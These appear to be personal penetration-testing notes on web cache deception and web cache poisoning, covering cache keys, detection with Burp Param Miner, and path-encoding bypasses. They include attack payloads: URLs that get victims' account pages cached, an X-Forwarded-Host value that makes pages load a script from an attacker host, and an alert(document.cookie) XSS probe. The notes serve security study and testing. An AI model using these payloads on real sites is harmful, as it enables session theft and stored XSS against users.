# Basic
- Cache servers (CDN) cache static contents based on extensions. They decide to send the request to the upstream or not, based on **Cache Key**.
  - `Scheme|Method|Host|Path`  →  `https|GET|example.com|/news/show.php?id=1`
- **UnKeyed Input:** Parameters (headers) that doesn't affect the **Cache Key**.
  - Change a request header  →  Response header changes from `hit` to `miss`  →  the header is in **Cache Key**.
- Cache related headers:
  - `miss`: The request hasn’t been cached so far. 
  - `hit`: The **Cache Key** exist in CDN and the response comes from CDN (and not from upstream).

# Web Cache Deception
- Force victim to store his sensitive information into cache, then attacker read them from Cache server.
  -  Victim  →  `https://www.example.com/account.php/mamad.css`  →  Information is cached (`MISS`)
  -  Attacker  →  `https://www.example.com/account.php/mamad.css`  →  Gets victim's information (`HIT`)
### Detection
- Checking if the target is behind CDN or not. (find an static resource)
- Look for APIs which returns sensitive information.
- Try to manipulate request to force the CDN to cache it. (make it look static)
- Each CDN provider has some extensions to cache. ([Cloudflare](https://developers.cloudflare.com/cache/concepts/default-cache-behavior/))
  - Sometimes there is no obvious documentation (Akamai), read write-ups to collect 
  ```
  jpg,jpeg,png,gif,webp,bmp,ico,css,js,pdf,doc,docx,xls,xlsx,ppt,pptx,mp3,mp4,m4a,m4v,ogg,ogv,webm,flv,swf,woff,woff2,eot,ttf,otf,zip,tar,gz,tgz,rar
  ```  
### Bypass 
- `.css` is blocked:
  ```bash
  %2ecss
  /;test.css
  /!test.css
  /.css
  /backend-api/conversations     →   /backend-api/conversations%0A%0D-testtest.css
  /api/auth                      →   /api/auth/%0A%0D%09session.css
  ```

# Web Cache Poisoning
- Store malicious content in the cache server to XSS (stored) other users.
- We should look for **UnKeyed** headers that reflects in the page. (like `X-Forwarded-Host`)
  - The response should be cacheable.
### Detection
- Identify if the application uses cache server or not.
- Scan various requests by [](https://www.notion.so/Useful-Public-Tools-295b8c4744ef427b8c27a04dab8386fb?pvs=21), then manually identify an **unKeyed input**.
  - Add _Param Miner_ extension from BApp Store of BurpSuite.
  - Right-click on Request  →  Extensions  →  Param Miner  →  Guess params  →  Guess headers
  - Add [wordlist](https://github.com/PortSwigger/param-miner/blob/master/resources/headers) to `custom wordlist path`.
  - Check running of the extension in **Logger** tab of BurpSuite.
  - Check if there is an `secret uncached header` in: Target  →  Site map
    ```
    X-Forwarded-Host: icollab.info
    ```
- Scan various requests manually and look for Cookie reflection, then manually work on it.
  ```html
  <script type="text/javascript" src="//icollab.info/resources/js/tracking.js"></script>
  ```
- Create `/resources/js/tracking.js` in attacker server and put maliciuos code in it.
  ```html
  alert(document.cookie)
  ```

# Resource
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception
- https://book.hacktricks.xyz/pentesting-web/cache-deception
